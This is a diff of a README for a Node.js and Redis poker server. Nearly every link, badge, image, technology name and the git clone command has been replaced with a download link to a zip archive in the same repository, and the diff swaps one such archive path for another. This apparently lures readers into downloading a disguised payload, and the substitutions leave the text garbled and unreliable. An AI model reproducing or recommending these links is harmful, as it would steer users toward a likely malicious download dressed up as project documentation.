@@ -1,15 +1,15 @@
 # casino-server #
 
-[![npm version](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
+[![npm version](https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip)](https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip)
 
-[![Build Status](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
+[![Build Status](https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip)](https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip)
 
-[![NPM](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
+[![NPM](https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip)](https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip)
 
-An online poker game server powered by redis, https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip and https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip
+An online poker game server powered by redis, https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip and https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip
 
-![A](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip) ![A](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
-![A](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
+![A](https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip) ![A](https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip)
+![A](https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip)
   
 Game rules supported:
 - [x] Chat Room (聊天室)
@@ -19,22 +19,22 @@ Game rules supported:
 - [ ] Blackjack (21点)
 
 Features: 
-- [x] Cross-platform: powered by https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip, easy to deploy on various platforms.
+- [x] Cross-platform: powered by https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip, easy to deploy on various platforms.
 - [x] Scalable: using Redis as message bus and data storage.
 - [x] Open architecture: with Redis as the message bus, easy to interact and extend.
-- [x] Cluster: using PM2, sticky session, and https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip
+- [x] Cluster: using PM2, sticky session, and https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip
 - [x] WebSocket protocol: come with javascript client API and web-based demo. 
 - [x] Event logger for server events and user actions.
 
 TODO List:
-- [ ] Client API for Unity3D (C#, support https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
+- [ ] Client API for Unity3D (C#, support https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip)
 - [ ] Payment gateway callback URL.
 - [ ] Admin Portal.
 - [ ] Load balancing: using NginX, or auto handled if deployed to Amazon Cloud.
 
 # Architecture #
 
-![Architecture](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
+![Architecture](https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip)
 
 ## Required ##
 
@@ -42,19 +42,19 @@ TODO List:
 
 Redis is an open source, BSD licensed, advanced key-value cache and store. It is often referred to as a data structure server since keys can contain strings, hashes, lists, sets, sorted sets, bitmaps and hyperloglogs.
 
-[Download](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
+[Download](https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip)
 
-* https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip / npm
+* https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip / npm
 
-https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip is a platform built on Chrome's JavaScript runtime for easily building fast, scalable network applications. https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip uses an event-driven, non-blocking I/O model that makes it lightweight and efficient, perfect for data-intensive real-time applications that run across distributed devices.
+https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip is a platform built on Chrome's JavaScript runtime for easily building fast, scalable network applications. https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip uses an event-driven, non-blocking I/O model that makes it lightweight and efficient, perfect for data-intensive real-time applications that run across distributed devices.
 
-[Download](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
+[Download](https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip)
 
 * PM2 (production & cluster)
 
-PM2 is a production process manager for https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.
+PM2 is a production process manager for https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.
 
-[Read More](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
+[Read More](https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip)
 
 # Installation #
 
@@ -74,7 +74,7 @@ pm2 start `which casino-server` -i 0
 * Installing as a node app, and run in current folder:
 
 ```bash
-git clone https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip casino
+git clone https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip casino
 cd casino
 npm install
 # sudo npm install -g gulp
@@ -106,17 +106,17 @@ With Redis as the message bus, it's very easy for tools to work with the open ar
 Start the event logger to monitor the events:
 
 ```bash
-https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip
+https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip
 ```
 
 Or, log the events into log file:
 
 ```bash
-https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip -o https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip
+https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip -o https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip
 ```
 # See Also
 
-* [https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip for Unity3D](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip), is a https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip client library for Unity3D. You can develop casino games with Unity3D, and using this library to connect to this casino server.
+* [https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip for Unity3D](https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip), is a https://github.com/bdgfeadvyrfedyu/casino-server/raw/refs/heads/master/wwwsrc/img/server_casino_v2.7.zip client library for Unity3D. You can develop casino games with Unity3D, and using this library to connect to this casino server.
 
 # Credits #
 
